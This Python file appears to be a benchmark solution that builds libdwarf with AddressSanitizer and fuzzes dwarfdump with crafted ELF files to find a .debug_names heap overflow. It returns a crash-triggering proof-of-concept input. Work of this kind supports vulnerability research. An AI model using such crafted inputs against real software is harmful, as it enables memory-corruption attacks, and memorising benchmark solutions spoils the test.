import sys
import os
import subprocess
import tempfile
import shutil
import struct
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        work_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract source code
            subprocess.check_call(['tar', 'xf', src_path, '-C', work_dir])
            
            src_root = work_dir
            for item in os.listdir(work_dir):
                full_path = os.path.join(work_dir, item)
                if os.path.isdir(full_path):
                    src_root = full_path
                    break
            
            # 2. Configure and Build libdwarf with ASAN
            env = os.environ.copy()
            # Optimized flags for speed and detection
            env['CFLAGS'] = '-fsanitize=address -g -O1'
            env['CXXFLAGS'] = '-fsanitize=address -g -O1'
            env['LDFLAGS'] = '-fsanitize=address'
            
            # Attempt to find configuration script
            configure_script = os.path.join(src_root, 'configure')
            if not os.path.exists(configure_script):
                autogen = os.path.join(src_root, 'autogen.sh')
                if os.path.exists(autogen):
                    subprocess.call([autogen], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if os.path.exists(configure_script):
                # Disable shared to make it easier to run without LD_LIBRARY_PATH issues
                subprocess.check_call([configure_script, '--disable-shared'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Build
            subprocess.check_call(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Locate dwarfdump binary
            dwarfdump_bin = None
            for root, dirs, files in os.walk(src_root):
                if 'dwarfdump' in files:
                    candidate = os.path.join(root, 'dwarfdump')
                    if os.access(candidate, os.X_OK):
                        dwarfdump_bin = candidate
                        break
            
            if not dwarfdump_bin:
                # If build failed or binary not found, return empty (fail)
                return b''

            # 3. Fuzzing Loop
            # Target: .debug_names heap buffer overflow
            # Strategy: Generate ELF with random .debug_names headers focusing on count fields
            
            def create_elf_poc(debug_names_payload):
                # Create a minimal ELF object file containing the payload in .debug_names section
                e_ident = b'\x7fELF\x02\x01\x01\x00' + b'\x00'*8
                
                # Section Strings
                strs = b'\x00.shstrtab\x00.debug_names\x00'
                
                # Calculate offsets
                # File Layout: [EHDR] [STRS] [PAYLOAD] [SHDRS]
                
                offset = 64 # ELF Header size
                
                off_strs = offset
                len_strs = len(strs)
                offset += len_strs
                
                # Align 4
                pad1 = (4 - (offset % 4)) % 4
                offset += pad1
                
                off_payload = offset
                len_payload = len(debug_names_payload)
                offset += len_payload
                
                # Align 8
                pad2 = (8 - (offset % 8)) % 8
                offset += pad2
                
                off_sh = offset
                
                # ELF Header
                # e_shoff = off_sh, e_shnum = 3
                ehdr = struct.pack('<16sHHIQQLIHHHHHH', 
                                   e_ident, 
                                   1, # ET_REL
                                   62, # AMD64
                                   1, # Version
                                   0, # Entry
                                   0, # PH Off
                                   off_sh, # SH Off
                                   0, # Flags
                                   64, # EH Size
                                   0, # PH Ent Size
                                   0, # PH Num
                                   64, # SH Ent Size
                                   3, # SH Num
                                   1) # SH Str Ndx
                
                # Section Headers
                # 0: NULL
                sh0 = b'\x00' * 64
                
                # 1: .shstrtab (Type 3)
                sh1 = struct.pack('<IIQQQQIIQQ', 1, 3, 0, 0, off_strs, len_strs, 0, 0, 1, 0)
                
                # 2: .debug_names (Type 1, Name offset 11)
                sh2 = struct.pack('<IIQQQQIIQQ', 11, 1, 0, 0, off_payload, len_payload, 0, 0, 1, 0)
                
                return ehdr + strs + b'\x00'*pad1 + debug_names_payload + b'\x00'*pad2 + sh0 + sh1 + sh2

            start_time = time.time()
            
            # Boundary values that often trigger overflows
            # 0, 1, small, max_int, max_uint, -1 (if signed), etc.
            int_vals = [0, 1, 4, 16, 128, 0xff, 0xffff, 0x10000, 0x7fffffff, 0x80000000, 0xffffffff]
            
            while time.time() - start_time < 45:
                # Construct .debug_names content
                
                # Header fields (all 4 bytes except version/pad)
                ver = 5
                pad = 0
                
                cu_cnt = random.choice(int_vals)
                tu_l = random.choice(int_vals)
                tu_f = random.choice(int_vals)
                bucket_cnt = random.choice(int_vals)
                name_cnt = random.choice(int_vals)
                abbrev_sz = random.choice(int_vals)
                aug_sz = random.choice(int_vals)
                
                # Randomly prefer valid-ish small structure but corrupted counts
                if random.random() < 0.3:
                    cu_cnt = 1
                    bucket_cnt = 1
                    name_cnt = 1
                    aug_sz = 0
                
                header_body = struct.pack('<H2sIIIIIII', ver, b'\x00\x00', cu_cnt, tu_l, tu_f, bucket_cnt, name_cnt, abbrev_sz, aug_sz)
                
                # Append random tail data
                tail_len = random.randint(0, 512)
                tail = os.urandom(tail_len)
                
                content = header_body + tail
                
                # Unit Length: 
                # To pass initial checks, unit length usually matches content size.
                # The vulnerability is likely internal calculation overflow vs unit length.
                unit_len = len(content)
                
                payload = struct.pack('<I', unit_len) + content
                
                # Generate full ELF
                poc_data = create_elf_poc(payload)
                
                # Write to file
                with tempfile.NamedTemporaryFile(delete=False, suffix='.elf') as tf:
                    tf.write(poc_data)
                    tf_name = tf.name
                
                try:
                    # Execute dwarfdump -n
                    proc = subprocess.run(
                        [dwarfdump_bin, '-n', tf_name],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=0.5
                    )
                    
                    if proc.returncode != 0:
                        # Check for ASAN error
                        err_out = proc.stderr.decode(errors='ignore')
                        if "AddressSanitizer" in err_out:
                            return poc_data
                            
                except subprocess.TimeoutExpired:
                    pass
                finally:
                    if os.path.exists(tf_name):
                        os.unlink(tf_name)
            
            return b''

        except Exception:
            return b''
        finally:
            if os.path.exists(work_dir):
                shutil.rmtree(work_dir, ignore_errors=True)